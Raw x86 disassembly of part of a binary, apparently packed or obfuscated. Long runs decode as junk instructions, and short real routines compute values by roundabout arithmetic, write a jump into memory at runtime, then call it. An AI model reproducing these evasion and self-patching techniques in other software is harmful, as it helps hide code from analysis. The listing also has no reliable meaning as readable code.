  40ff76:	sub    DWORD PTR [ebx-0x5c14f757],esp
  40ff7c:	and    al,0x14
  40ff7e:	inc    eax
  40ff7f:	nop
  40ff80:	out    0xa,eax
  40ff82:	push   0x64
  40ff84:	xchg   ebx,eax
  40ff85:	mov    bh,0x95
  40ff87:	imul   esp,DWORD PTR [esi+0x67144826],0xffffffdd
  40ff8e:	or     DWORD PTR [ecx],ecx
  40ff90:	push   ebp
  40ff91:	add    esi,DWORD PTR [edi+0x63a9df5f]
  40ff97:	jnp    0x40ff23
  40ff99:	or     al,0xbd
  40ff9b:	cwde   
  40ff9c:	arpl   WORD PTR [ecx],di
  40ff9e:	cmp    edi,DWORD PTR [edi-0x5119388b]
  40ffa4:	add    ebx,DWORD PTR [ebp+0x6ea51b45]
  40ffaa:	xchg   ebx,eax
  40ffab:	mov    dl,0x71
  40ffad:	inc    ebx
  40ffae:	xor    eax,0xac6443c1
  40ffb3:	sbb    edx,eax
  40ffb5:	jp     0x40ff96
  40ffb7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ffb8:	ds inc ecx
  40ffba:	xchg   DWORD PTR [esp+ecx*1],ebp
  40ffbd:	jmp    0x84cb:0x400a911f
  40ffc4:	xlat   BYTE PTR ds:[ebx]
  40ffc5:	ds jp  0x40ffb2
  40ffc8:	popf   
  40ffc9:	shr    DWORD PTR [ebp+0x6fe5604a],cl
  40ffcf:	imul   BYTE PTR ds:0x2810c1e4
  40ffd5:	int3   
  40ffd6:	cmp    DWORD PTR [eax-0x565c8e42],ebp
  40ffdc:	jmp    0x2e9:0xd801c662
  40ffe3:	stos   DWORD PTR es:[edi],eax
  40ffe4:	mov    bh,0xdd
  40ffe6:	mov    dh,0xd6
  40ffe8:	sub    ebx,eax
  40ffea:	dec    ebp
  40ffeb:	cmp    al,0x4d
  40ffed:	xor    eax,0x26650e51
  40fff2:	neg    DWORD PTR [eax+0x63]
  40fff5:	and    DWORD PTR [ecx+0x56],0xffffffc2
  40fff9:	mov    eax,0xd012080a
  40fffe:	shr    dh,0x14
  410001:	mov    edi,DWORD PTR [ebp-0x41]
  410004:	sub    eax,0x92b19520
  410009:	mov    ah,0x3b
  41000b:	int    0xca
  41000d:	stos   BYTE PTR es:[edi],al
  41000e:	xor    edi,DWORD PTR [esi]
  410010:	inc    ebx
  410011:	xor    dh,BYTE PTR [esi+0x5a]
  410014:	mov    ah,0x29
  410016:	push   edi
  410017:	outs   dx,DWORD PTR ds:[esi]
  410018:	pop    esp
  410019:	sub    DWORD PTR [ecx+0x2fff357a],esp
  41001f:	pusha  
  410020:	cmp    al,0x95
  410022:	aad    0x5
  410024:	or     edi,DWORD PTR [edi]
  410026:	sahf   
  410027:	sbb    esp,DWORD PTR [eax+0x6]
  41002a:	std    
  41002b:	sbb    eax,DWORD PTR [esi-0x29d61c50]
  410031:	inc    esi
  410032:	dec    esi
  410033:	imul   esp,DWORD PTR [edi-0xd],0xb096aa5b
  41003a:	lahf   
  41003b:	test   eax,0x8baa881a
  410040:	jge    0x41005e
  410042:	adc    ebx,DWORD PTR [eax]
  410044:	mov    eax,0x3a89d351
  410049:	jns    0x4100a9
  41004b:	adc    BYTE PTR [ecx-0x6e388b9c],0x6f
  410052:	inc    esp
  410053:	repnz lds esi,FWORD PTR ds:0xe6841beb
  41005a:	mov    ebx,0x95ba8400
  41005f:	fcomip st,st(1)
  410061:	xchg   ecx,eax
  410062:	pop    eax
  410063:	sbb    eax,0x39a551d6
  410068:	and    bl,bh
  41006a:	cmc    
  41006b:	les    bp,DWORD PTR [ecx+0x3c036996]
  410072:	mov    DWORD PTR [ecx],ebp
  410074:	push   ss
  410075:	push   0x11
  410077:	push   ebx
  410078:	cmp    BYTE PTR [ebp-0x7f],bh
  41007b:	sbb    bh,BYTE PTR [ecx+0x6b7dd0ef]
  410081:	out    0x58,ax
  410084:	mov    ch,BYTE PTR [eax+ecx*2]
  410087:	add    DWORD PTR [ecx],ebx
  410089:	xor    DWORD PTR [ebx+0x3278b4c1],0x5c
  410090:	xor    BYTE PTR [edx],cl
  410092:	jne    0x41010e
  410094:	fidiv  DWORD PTR [ecx+0x12bde165]
  41009b:	sub    al,0xe
  41009d:	stc    
  41009e:	enter  0x35d7,0xa6
  4100a2:	adc    bh,BYTE PTR [esi]
  4100a4:	lock xchg edx,eax
  4100a6:	cdq    
  4100a7:	test   al,ah
  4100a9:	mov    bl,0x25
  4100ab:	test   ebx,0xe0a1417c
  4100b1:	inc    eax
  4100b2:	dec    eax
  4100b3:	rcr    BYTE PTR [edi-0x5a],1
  4100b6:	mov    ah,0xc7
  4100b8:	ja     0x41011d
  4100ba:	test   BYTE PTR [esi-0x5b023b1],bh
  4100c0:	pop    edx
  4100c1:	repz mov bl,0x59
  4100c4:	aad    0x2
  4100c6:	push   ds
  4100c7:	push   eax
  4100c8:	add    al,0xd9
  4100ca:	not    BYTE PTR [ebp+0x713f804f]
  4100d0:	adc    al,bh
  4100d2:	jmp    FWORD PTR [ebx]
  4100d4:	cdq    
  4100d5:	jmp    0x440d:0xf8170519
  4100dc:	jns    0x410133
  4100de:	mov    ds:0xd64a73d,al
  4100e3:	cmp    dh,bl
  4100e5:	ja     0x410095
  4100e7:	mov    es,WORD PTR [ecx+0x9]
  4100ea:	mov    esp,edx
  4100ec:	aas    
  4100ed:	push   eax
  4100ee:	sub    eax,0x6c632951
  4100f3:	xor    edi,edi
  4100f5:	mov    eax,ds:0xe6e436b7
  4100fa:	jecxz  0x410138
  4100fc:	loopne 0x410089
  4100fe:	ret    0x9f5e
  410101:	inc    edi
  410102:	cmp    ebx,DWORD PTR [ebp+0x20698766]
  410108:	je     0x4100b9
  41010a:	inc    edi
  41010b:	(bad)  
  41010c:	(bad)  
  41010d:	mov    ecx,0xe5351e
  410112:	stc    
  410113:	sub    eax,0xf523872
  410118:	sbb    eax,0xe6deccef
  41011d:	clc    
  41011e:	xlat   BYTE PTR ds:[ebx]
  41011f:	xor    ch,ah
  410121:	in     eax,dx
  410122:	scas   al,BYTE PTR es:[edi]
  410123:	adc    bl,BYTE PTR [esi-0x19001846]
  410129:	outs   dx,DWORD PTR ds:[esi]
  41012a:	xor    eax,0xaa36cc2b
  41012f:	stos   DWORD PTR es:[edi],eax
  410130:	and    BYTE PTR [ecx+0x64],ch
  410133:	push   cs
  410134:	adc    edi,esi
  410136:	mov    bh,0x64
  410138:	cld    
  410139:	ror    BYTE PTR [ebx-0x1],1
  41013c:	xor    BYTE PTR [edi],al
  41013e:	inc    esi
  41013f:	and    dl,al
  410141:	push   edx
  410142:	mov    esi,0x59e60c53
  410147:	hlt    
  410148:	pop    edx
  410149:	dec    esp
  41014a:	popa   
  41014b:	jecxz  0x4100fc
  41014d:	bound  edi,QWORD PTR [edi+edi*1-0x6d]
  410151:	pop    ds
  410152:	mov    al,ds:0xdb561661
  410157:	(bad)  
  410158:	out    dx,al
  410159:	dec    esp
  41015a:	push   ss
  41015b:	xor    al,0x50
  41015d:	jge    0x41014a
  41015f:	jmp    0x4101c8
  410161:	cmp    eax,0x31122703
  410166:	je     0x4101d8
  410168:	loopne 0x410191
  41016a:	sbb    al,BYTE PTR [eax]
  41016c:	or     ebx,ecx
  41016e:	mov    ah,0xa6
  410170:	jle    0x41013f
  410172:	cld    
  410173:	mov    esp,0x84c26ae5
  410178:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410179:	fcomp  QWORD PTR ds:0x55bdd52b
  41017f:	xor    bh,BYTE PTR [edx+ebx*4]
  410182:	xlat   BYTE PTR ds:[ebx]
  410183:	push   esi
  410184:	xchg   ecx,eax
  410185:	arpl   WORD PTR [ebx+eiz*1+0x29],sp
  410189:	and    al,0x1
  41018b:	pushf  
  41018c:	outs   dx,BYTE PTR ds:[esi]
  41018d:	xchg   ebp,eax
  41018e:	in     al,0xbc
  410190:	pop    esi
  410191:	mov    ecx,0xe12d23d4
  410196:	in     eax,dx
  410197:	rcl    BYTE PTR [ecx-0x3b8899ba],0x92
  41019e:	adc    ch,BYTE PTR [ebx-0x7]
  4101a1:	inc    edx
  4101a2:	add    ah,BYTE PTR [ecx+0x5e]
  4101a5:	sbb    BYTE PTR [eax-0x28],0x34
  4101a9:	mov    eax,ds:0xc07063e4
  4101ae:	clc    
  4101af:	or     esi,edx
  4101b1:	and    eax,0x734e8bcd
  4101b6:	popf   
  4101b7:	push   ss
  4101b8:	sbb    BYTE PTR [edx+0x2b],bl
  4101bb:	loop   0x410203
  4101bd:	cli    
  4101be:	mov    ebx,0x2f5b84f4
  4101c3:	push   0x9aaf8f14
  4101c8:	enter  0xc8a3,0x2d
  4101cc:	mov    ds,WORD PTR [edi-0x229419d5]
  4101d2:	retf   0xb07b
  4101d5:	(bad)  
  4101d6:	enter  0x41c9,0xc0
  4101da:	fst    QWORD PTR [edx-0x6dea5f1f]
  4101e0:	push   0x62af9ca1
  4101e5:	add    DWORD PTR [ebx-0x1a66e761],edx
  4101eb:	or     dl,dl
  4101ed:	mov    dl,0x8d
  4101ef:	adc    al,0x3d
  4101f1:	imul   edi,DWORD PTR [esi-0x13c9c50b],0xffffff98
  4101f8:	loope  0x410180
  4101fa:	mov    esi,0x42cfb44b
  4101ff:	jb     0x410195
  410201:	aam    0x90
  410203:	dec    ebx
  410204:	push   cs
  410205:	jl     0x4101d4
  410207:	sub    dh,ch
  410209:	and    ah,dh
  41020b:	jmp    0x9ec3:0xcd5061fd
  410212:	fidiv  DWORD PTR [edi-0x35]
  410215:	mov    ds:0x9177edad,al
  41021a:	jae    0x41024e
  41021c:	je     0x4101bc
  41021e:	sub    al,BYTE PTR es:[esi+0xfdad94d]
  410225:	test   DWORD PTR ds:0x8b000004,esi
  41022b:	dec    ebp
  41022c:	mov    BYTE PTR [ebx],dh
  41022e:	sar    BYTE PTR [eax+0x209c],cl
  410234:	div    ecx
  410236:	mov    ecx,DWORD PTR ds:0x422518
  41023c:	mov    ecx,DWORD PTR [ecx+0x1a8]
  410242:	xor    edx,edx
  410244:	sub    ecx,eax
  410246:	mov    eax,DWORD PTR [ebp-0x4c]
  410249:	xor    eax,0x3daa
  41024e:	sub    eax,0x3375
  410253:	or     eax,0x6931
  410258:	lea    eax,[ebp+eax*1-0x6c25]
  41025f:	push   eax
  410260:	mov    eax,DWORD PTR [ebp-0x8c]
  410266:	push   0x18
  410268:	pop    esi
  410269:	div    esi
  41026b:	mov    esi,DWORD PTR [ebp-0x60]
  41026e:	xor    edx,edx
  410270:	div    esi
  410272:	mov    edx,DWORD PTR [ebp-0x44]
  410275:	mov    esi,DWORD PTR [ebp-0x34]
  410278:	xor    eax,edx
  41027a:	xor    edx,edx
  41027c:	div    esi
  41027e:	imul   eax,eax,0x7d2a
  410284:	sub    eax,0x928ded7
  410289:	push   eax
  41028a:	mov    eax,ds:0x422518
  41028f:	add    eax,0xaa
  410294:	push   eax
  410295:	mov    eax,DWORD PTR [ebp-0x3c]
  410298:	sub    ecx,eax
  41029a:	mov    eax,DWORD PTR [ebp-0x24]
  41029d:	push   DWORD PTR [ecx+eax*1+0xbd4]
  4102a4:	call   0x41e9f9
  4102a9:	mov    DWORD PTR [ebp-0x4],eax
  4102ac:	mov    ecx,DWORD PTR ds:0x422620
  4102b2:	lea    eax,[ebp+0x4]
  4102b5:	mov    DWORD PTR [ecx*4+0x422618],eax
  4102bc:	inc    DWORD PTR ds:0x422620
  4102c2:	mov    eax,DWORD PTR [ebp-0x4]
  4102c5:	mov    eax,DWORD PTR [ebp-0x4]
  4102c8:	xor    edx,edx
  4102ca:	shld   edx,eax,0x2
  4102ce:	shl    eax,0x2
  4102d1:	mov    ecx,0xca79a575
  4102d6:	mov    esi,0x9c1b89e8
  4102db:	xor    eax,ecx
  4102dd:	xor    edx,esi
  4102df:	cmp    eax,ecx
  4102e1:	jne    0x4105c9
  4102e7:	cmp    edx,esi
  4102e9:	jne    0x4105c9
  4102ef:	mov    eax,0xca79a571
  4102f4:	mov    edx,esi
  4102f6:	jmp    0x410669
  4102fb:	jmp    0x4105c9
  410300:	sbb    al,0xfc
  410302:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410303:	fs sbb bl,BYTE PTR es:[edx]
  410307:	mov    ebp,0x70cf8d86
  41030c:	jmp    0xc3f1b4f4
  410311:	xchg   edx,eax
  410312:	sbb    BYTE PTR [eax],bl
  410314:	mov    esi,0x80181814
  410319:	xor    al,0x6c
  41031b:	xor    eax,edx
  41031d:	dec    eax
  41031e:	out    dx,eax
  41031f:	jp     0x41038e
  410321:	in     al,0x9c
  410323:	(bad)  
  410324:	jno    0x410329
  410326:	loope  0x4102fb
  410328:	imul   esi,edi,0xfffffffe
  41032b:	xchg   BYTE PTR [esi-0x6bc79681],dh
  410331:	fsub   st(5),st
  410333:	cli    
  410334:	dec    edi
  410335:	dec    ebp
  410336:	std    
  410337:	ja     0x4102bf
  410339:	std    
  41033a:	jp     0x4102e4
  41033c:	mov    eax,ds:0xb8dfda0f
  410341:	add    eax,DWORD PTR [edx]
  410343:	pop    esi
  410344:	mov    ecx,0x9c07e3ae
  410349:	xchg   edi,eax
  41034a:	inc    eax
  41034b:	repz jp 0x41035b
  41034e:	je     0x4102ea
  410350:	jne    0x410380
  410352:	cmc    
  410353:	bound  esp,QWORD PTR [edx-0x6a]
  410356:	mov    ebp,0x6877c35f
  41035b:	mov    esp,edx
  41035d:	or     ebx,DWORD PTR [ecx]
  41035f:	sbb    al,0x6a
  410361:	xor    eax,ebx
  410363:	add    edx,0xcef3d555
  410369:	and    al,BYTE PTR [eax+0x70]
  41036c:	sub    ah,bh
  41036e:	add    eax,0x73d668cb
  410373:	push   esp
  410374:	adc    esp,DWORD PTR [edx+0x76]
  410377:	xor    esi,DWORD PTR [edx]
  410379:	das    
  41037a:	inc    ecx
  41037b:	lock sub DWORD PTR fs:[ecx+esi*2],ebp
  410380:	(bad)  
  410382:	pop    ss
  410383:	dec    ebx
  410384:	cli    
  410385:	jne    0x410310
  410387:	adc    BYTE PTR [ecx+0x35],dh
  41038a:	xchg   ebx,eax
  41038b:	ins    BYTE PTR es:[edi],dx
  41038c:	sub    ch,bh
  41038e:	retf   
  41038f:	xchg   ecx,eax
  410390:	stos   BYTE PTR es:[edi],al
  410391:	xchg   ebp,eax
  410392:	vxorps xmm7,xmm7,XMMWORD PTR [ecx+0x3f]
  410397:	pop    esp
  410398:	js     0x410360
  41039a:	jmp    0x5655:0x6ccad21c
  4103a1:	ret    
  4103a2:	fmul   DWORD PTR [esi]
  4103a4:	xchg   edi,eax
  4103a5:	xchg   ecx,eax
  4103a6:	cmp    dl,BYTE PTR ds:0x71feb759
  4103ac:	mov    dh,0x5f
  4103ae:	pushf  
  4103af:	in     eax,0x26
  4103b1:	mov    bl,BYTE PTR [ebp-0x7c]
  4103b4:	xchg   DWORD PTR [ebx-0x70],eax
  4103b7:	adc    DWORD PTR [esi],eax
  4103b9:	jne    0x4103e3
  4103bb:	fisubr DWORD PTR [esi+esi*4+0x5fcc0c09]
  4103c2:	jnp    0x410359
  4103c4:	jnp    0x410350
  4103c6:	adc    al,0x8f
  4103c8:	cmp    ecx,DWORD PTR [eax-0xd]
  4103cb:	mov    ebp,0xb85017cd
  4103d0:	leave  
  4103d1:	adc    al,0xff
  4103d3:	pop    edx
  4103d4:	sbb    DWORD PTR es:[edi+eax*4+0x5a09f89b],ebx
  4103dc:	mov    BYTE PTR [ebp+edi*1+0x1d],0xe7
  4103e1:	(bad)  
  4103e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4103e3:	call   0x4c98:0x99cf68ea
  4103ea:	loope  0x410463
  4103ec:	enter  0x6bc0,0x3e
  4103f0:	push   eax
  4103f1:	mov    esi,0xe67ec922
  4103f6:	mov    esp,0xdb1ac689
  4103fb:	add    DWORD PTR [ebx-0x42],eax
  4103fe:	jo     0x410426
  410400:	push   0x65095c6e
  410405:	pop    ebx
  410406:	mov    dh,0xae
  410408:	test   BYTE PTR [ecx],ch
  41040a:	and    DWORD PTR [eax+ecx*2],0xffffff92
  41040e:	sub    BYTE PTR ds:0x3c07248b,ah
  410414:	jns    0x4103ed
  410416:	aaa    
  410417:	scas   eax,DWORD PTR es:[edi]
  410418:	pop    ebp
  410419:	mov    bh,0xaa
  41041b:	mov    ch,0xf8
  41041d:	jmp    0x4103ae
  41041f:	pop    edi
  410420:	(bad)  
  410421:	outs   dx,DWORD PTR ds:[esi]
  410422:	int    0x6f
  410424:	cmp    BYTE PTR [esi],ch
  410426:	jl     0x410422
  410428:	mov    edi,0xb947cd5
  41042d:	sub    ecx,DWORD PTR [edx+0x6a]
  410430:	dec    ebp
  410431:	xor    esp,DWORD PTR [ecx+0x7c]
  410434:	cmp    BYTE PTR ds:0xf3b27f4d,dl
  41043a:	or     DWORD PTR [esi-0x47],0xffffffa2
  41043e:	jle    0x41046a
  410440:	daa    
  410441:	xchg   ecx,eax
  410442:	mov    cl,0x45
  410444:	scas   al,BYTE PTR es:[edi]
  410445:	dec    ecx
  410446:	enter  0xe5ea,0x51
  41044a:	loop   0x41042e
  41044c:	test   DWORD PTR [ebp-0x650d189a],edx
  410452:	cmp    eax,0xe4ed526a
  410457:	and    DWORD PTR [edi+0x10],esp
  41045a:	push   eax
  41045b:	popf   
  41045c:	dec    ebp
  41045d:	lea    ebp,[esi-0x3d2e7868]
  410463:	inc    esi
  410464:	mov    bl,0x63
  410466:	mov    esp,0x495f3946
  41046b:	push   es
  41046c:	mov    ss,WORD PTR [eax-0x9]
  41046f:	mov    dl,0x39
  410471:	push   ebx
  410472:	aam    0xc4
  410474:	pop    ss
  410475:	cli    
  410476:	das    
  410477:	rcr    edi,1
  410479:	sti    
  41047a:	stos   BYTE PTR es:[edi],al
  41047b:	push   esi
  41047c:	push   ecx
  41047d:	ins    BYTE PTR es:[edi],dx
  41047e:	fbstp  TBYTE PTR [ebx-0xab18ee7]
  410484:	ja     0x410410
  410486:	sub    BYTE PTR [edx-0x1a],bh
  410489:	push   esi
  41048a:	dec    eax
  41048b:	mov    ch,0xa4
  41048d:	loope  0x410410
  41048f:	or     BYTE PTR [esi+esi*4-0xfba805],dh
  410496:	sti    
  410497:	xor    BYTE PTR [edx],cl
  410499:	cmp    ebp,DWORD PTR [esi-0x7cc51611]
  41049f:	mov    al,ds:0x30555c0
  4104a4:	jecxz  0x41042f
  4104a6:	pop    esp
  4104a7:	das    
  4104a8:	cmp    ah,BYTE PTR [edx-0x48]
  4104ab:	dec    ebx
  4104ac:	jo     0x410465
  4104ae:	retf   0xa5ae
  4104b1:	retf   0x6c89
  4104b4:	in     eax,dx
  4104b5:	ret    0x3512
  4104b8:	nop
  4104b9:	ss leave 
  4104bb:	jae    0x41051f
  4104bd:	jmp    0x9b23:0x7f75e588
  4104c4:	call   0x225183c5
  4104c9:	pop    ebx
  4104ca:	xchg   ebp,eax
  4104cb:	adc    eax,0xbedf61e9
  4104d0:	dec    esp
  4104d1:	or     ch,bh
  4104d3:	mov    ds,WORD PTR [edi+0x8]
  4104d6:	push   es
  4104d7:	mov    ebx,esp
  4104d9:	lock int3 
  4104db:	idiv   BYTE PTR ss:[ebx+edi*4]
  4104df:	xchg   BYTE PTR ds:0x645d2023,bh
  4104e5:	dec    ebx
  4104e6:	mov    bl,0x2c
  4104e8:	jbe    0x410511
  4104ea:	inc    esp
  4104eb:	adc    BYTE PTR [eax-0x2a],ch
  4104ee:	int    0xaa
  4104f0:	jmp    0xf6da:0x73681ab8
  4104f7:	push   0x3f2b0503
  4104fc:	dec    edi
  4104fd:	mov    BYTE PTR [eax-0x42],bh
  410500:	je     0x410513
  410502:	and    esp,ebx
  410504:	xchg   esp,eax
  410505:	adc    edi,eax
  410507:	add    al,0x99
  410509:	push   ecx
  41050a:	inc    esi
  41050b:	test   eax,0x1542571a
  410510:	push   es
  410511:	mov    al,0xcb
  410513:	dec    ebp
  410514:	inc    eax
  410515:	xlat   BYTE PTR ds:[ebx]
  410516:	push   ss
  410517:	add    cl,dl
  410519:	xor    bl,ah
  41051b:	xchg   edi,eax
  41051c:	out    0x62,al
  41051e:	call   0xfef1:0xcad4885f
  410525:	jmp    0x180b:0x500dedae
  41052c:	gs gs scas eax,DWORD PTR es:[edi]
  41052f:	ror    BYTE PTR [eax+ebp*1-0x1f6cc343],1
  410536:	leave  
  410537:	imul   ebx,DWORD PTR [edx-0x1b],0x3e
  41053b:	jo     0x41057c
  41053d:	(bad)  
  41053e:	into   
  41053f:	stos   BYTE PTR es:[edi],al
  410540:	or     DWORD PTR [edx-0x303a936e],esi
  410546:	add    BYTE PTR [edx+0x5],0x3a
  41054a:	(bad)  
  41054b:	cmp    al,dl
  41054d:	mov    dh,0xe2
  41054f:	jns    0x4104fb
  410551:	sbb    bh,BYTE PTR [eax-0xc9d9432]
  410557:	dec    eax
  410558:	jnp    0x4105a9
  41055a:	and    eax,0xdf8739ea
  41055f:	xor    eax,0x243d5832
  410564:	add    al,0x6f
  410566:	out    0xd2,al
  410568:	jno    0x4104f4
  41056a:	mov    ds:0x44663eee,al
  41056f:	pop    DWORD PTR [ebx-0x7f]
  410572:	leave  
  410573:	sbb    DWORD PTR [eax],edx
  410575:	or     al,0x45
  410577:	and    eax,0x552afd45
  41057c:	sub    eax,0x4357fab5
  410581:	out    dx,al
  410582:	(bad)  
  410583:	jmp    0x45ec7d5c
  410588:	data16 mov al,ds:0xbd627a91
  41058e:	push   ds
  41058f:	mov    eax,ds:0xaf16c7f6
  410594:	sub    BYTE PTR [edi+0x362c9b49],0xd1
  41059b:	pop    edi
  41059c:	xchg   ecx,eax
  41059d:	push   cs
  41059e:	push   cs
  41059f:	xor    eax,0xc0e8dd66
  4105a4:	lods   eax,DWORD PTR ds:[esi]
  4105a5:	sbb    al,0x7b
  4105a7:	in     eax,dx
  4105a8:	call   0x5d5d24db
  4105ad:	mov    al,ds:0x70fcf7d3
  4105b2:	pop    ebp
  4105b3:	fimul  DWORD PTR [eax+0x379a5369]
  4105b9:	and    eax,0x120d8891
  4105be:	push   edi
  4105bf:	cwde   
  4105c0:	push   0xe
  4105c2:	xor    al,ch
  4105c4:	sahf   
  4105c5:	inc    ebp
  4105c6:	test   al,0xaf
  4105c8:	lock lea eax,[ebp-0x10]
  4105cc:	mov    DWORD PTR [ebp-0x9c],eax
  4105d2:	mov    eax,DWORD PTR [ebp-0x54]
  4105d5:	mov    DWORD PTR [ebp-0x10],eax
  4105d8:	mov    eax,DWORD PTR [ebp-0x10]
  4105db:	mov    ecx,DWORD PTR [ebp-0x4]
  4105de:	sub    eax,ecx
  4105e0:	mov    DWORD PTR [ebp-0x10],eax
  4105e3:	mov    eax,DWORD PTR [ebp-0x20]
  4105e6:	mov    ecx,DWORD PTR [ebp-0x1c]
  4105e9:	sub    DWORD PTR [ebp-0x10],eax
  4105ec:	mov    eax,DWORD PTR [ebp-0x4]
  4105ef:	mov    DWORD PTR [eax],0x658776e9
  4105f5:	mov    DWORD PTR [eax+0x4],0xab756547
  4105fc:	mov    eax,DWORD PTR [ebp-0x10]
  4105ff:	mov    ecx,DWORD PTR [ebp-0x4]
  410602:	mov    DWORD PTR [ecx+0x1],eax
  410605:	mov    eax,ds:0x422394
  41060a:	push   DWORD PTR [eax]
  41060c:	push   DWORD PTR ds:0x422608
  410612:	push   DWORD PTR ds:0x42239c
  410618:	push   DWORD PTR ds:0x4225e8
  41061e:	push   DWORD PTR ds:0x42265c
  410624:	push   0xa4069aaa
  410629:	push   0xa4069aae
  41062e:	push   DWORD PTR [ebp-0x5c]
  410631:	mov    eax,DWORD PTR [ebp-0x4]
  410634:	call   eax
  410636:	mov    eax,DWORD PTR [edi]
  410638:	mov    eax,DWORD PTR [ebp+0x8]
  41063b:	push   DWORD PTR [eax]
  41063d:	call   0x4110ff
  410642:	mov    eax,ds:0x422518
  410647:	push   0x4
  410649:	add    eax,0x1dc
  41064e:	push   eax
  41064f:	push   edi
  410650:	call   0x415231
  410655:	mov    eax,0xca79a57d
  41065a:	jmp    0x4102f4
  41065f:	mov    eax,0xca79a575
  410664:	mov    edx,0x9c1b89e8
  410669:	pop    esi
  41066a:	pop    ebx
  41066b:	leave  
  41066c:	ret    0x4
  41066f:	push   ebp
  410670:	mov    ebp,esp
  410672:	sub    esp,0x20
  410675:	push   ebx
  410676:	push   edi
  410677:	mov    DWORD PTR [ebp-0x8],0x522e
  41067e:	mov    DWORD PTR [ebp-0x4],0x3dbd
  410685:	mov    DWORD PTR [ebp-0x10],0x53f1
  41068c:	mov    DWORD PTR [ebp-0xc],0x631b
  410693:	mov    DWORD PTR [ebp-0x18],0x524d
  41069a:	mov    DWORD PTR [ebp-0x14],0x1600
  4106a1:	mov    eax,DWORD PTR [ebp-0x18]
  4106a4:	mov    ecx,DWORD PTR [ebp-0x14]
  4106a7:	mov    edx,DWORD PTR [ebp-0x10]
  4106aa:	mov    edi,DWORD PTR [ebp-0xc]
  4106ad:	push   edi
  4106ae:	push   edx
  4106af:	push   ecx
  4106b0:	push   eax
  4106b1:	call   0x416c20
  4106b6:	mov    ecx,DWORD PTR [ebp-0x8]
  4106b9:	mov    edi,DWORD PTR [ebp-0x4]
  4106bc:	add    eax,0x1dc8
  4106c1:	adc    edx,0x6fbf
  4106c7:	and    edx,edi
  4106c9:	push   0x1061
  4106ce:	and    eax,ecx
  4106d0:	or     edx,0x23ff
  4106d6:	push   0x4000022f
  4106db:	jmp    0x4109bb
  4106e0:	pop    edi
  4106e1:	jp     0x410689
  4106e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4106e4:	mov    ds:0x103a5b1c,al
  4106e9:	fsub   QWORD PTR [edi-0x44]
  4106ec:	leave  
  4106ed:	js     0x41074e
  4106ef:	jo     0x410759
  4106f1:	mov    ds,WORD PTR [eax]
  4106f3:	sbb    BYTE PTR [edx-0x1e7e7ec],bl
  4106f9:	pop    esp
  4106fa:	aaa    
  4106fb:	or     BYTE PTR cs:[eax+0x68],ch
  4106ff:	push   eax
  410700:	lods   al,BYTE PTR ds:[esi]
  410701:	mov    eax,ds:0xc279d592
  410706:	cmp    edi,eax
  410708:	gs inc eax
  41070a:	xlat   BYTE PTR ds:[ebx]
  41070b:	rcr    ebp,0x15
  41070e:	mov    edx,0x9853a5b7
  410713:	in     eax,dx
  410714:	dec    esp
  410715:	sti    
  410716:	shl    bl,1
  410718:	das    
  410719:	xchg   DWORD PTR [ebp-0x5a045b7d],esi
  41071f:	jecxz  0x4106e8
  410721:	and    eax,0x7c4c1b53
  410726:	sbb    DWORD PTR [edi],edx
  410728:	sbb    BYTE PTR [eax],bh
  41072a:	xor    BYTE PTR [edx-0x9],bh
  41072d:	adc    DWORD PTR [eax+0x1cf8bc2d],edi
  410733:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410734:	test   DWORD PTR [edx],edi
  410736:	(bad)  
  410737:	out    dx,al
  410738:	dec    eax
  410739:	adc    al,0x78
  41073b:	mov    ecx,0xf719009c
  410740:	cmp    eax,0xe6c578c3
  410745:	loop   0x410750
  410747:	pop    eax
  410748:	xlat   BYTE PTR ds:[ebx]
  410749:	xchg   edi,eax
  41074a:	mov    dh,0x4c
  41074c:	inc    esp
  41074d:	mov    ds:0xbda97135,al
  410752:	mov    al,ds:0xbd27944a
  410757:	sbb    dl,BYTE PTR [eax]
  410759:	cmc    
  41075a:	mov    DWORD PTR [edx],eax
  41075c:	cs mov ebp,0xddeff6e7
  410762:	mov    cl,0x9a
  410764:	xor    ch,BYTE PTR [esi+0xb]
  410767:	(bad)  
  410768:	cmp    cl,BYTE PTR [eax+0x55]
  41076b:	stc    
  41076c:	dec    edx
  41076d:	xchg   ecx,eax
  41076e:	inc    edi
  41076f:	out    0xdc,al
  410771:	cld    
  410772:	ins    DWORD PTR es:[edi],dx
  410773:	clc    
  410774:	je     0x41075e
  410776:	ret    0x182f
  410779:	popa   
  41077a:	pop    ebp
  41077b:	outs   dx,DWORD PTR ds:[esi]
  41077c:	push   cs
  41077d:	sub    eax,0x583b138f
  410782:	iret   
  410783:	add    BYTE PTR [esi-0x19ea6927],ch
  410789:	add    ecx,eax
  41078b:	cli    
  41078c:	mov    eax,0xb584dc82
  410791:	ins    BYTE PTR es:[edi],dx
  410792:	out    dx,eax
  410793:	mov    eax,0xaa7eaa6d
  410798:	test   ebx,0xf171fa10
  41079e:	inc    edi
  41079f:	pop    ds
  4107a0:	div    DWORD PTR [ecx+0x2bc2d30e]
  4107a6:	adc    ebp,DWORD PTR [ebp-0x10a06fef]
  4107ac:	out    0xa6,al
  4107ae:	mov    ?,WORD PTR [ecx+0x211cd57e]
  4107b4:	add    BYTE PTR [ebx-0x1ed970dd],0x79
  4107bb:	xor    al,0x4e
  4107bd:	call   0x74f1099a
  4107c2:	push   edx
  4107c3:	mov    ebp,0x7f1f1f58
  4107c8:	out    dx,eax
  4107c9:	enterw 0xea3a,0xc
  4107ce:	jmp    0x5807:0xd3eda671
  4107d5:	out    dx,eax
  4107d6:	rcr    DWORD PTR [ebx],cl
  4107d8:	cwde   
  4107d9:	sbb    cl,BYTE PTR [ecx+0x59f2b4cf]
  4107df:	std    
  4107e0:	cmp    cl,BYTE PTR [esi+ecx*4+0x140c5064]
  4107e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4107e8:	or     ch,dl
  4107ea:	fwait
  4107eb:	icebp  
  4107ec:	fisubr WORD PTR [ecx+0x1dc233ab]
  4107f2:	jns    0x4107a9
  4107f4:	push   ecx
  4107f5:	cmp    eax,0xe4976bdd
  4107fa:	cmp    edx,DWORD PTR [edi-0x5c]
  4107fd:	and    al,0x40
  4107ff:	xor    DWORD PTR [ebx+edx*1],ebx
  410802:	daa    
  410803:	pop    esi
  410804:	je     0x41087d
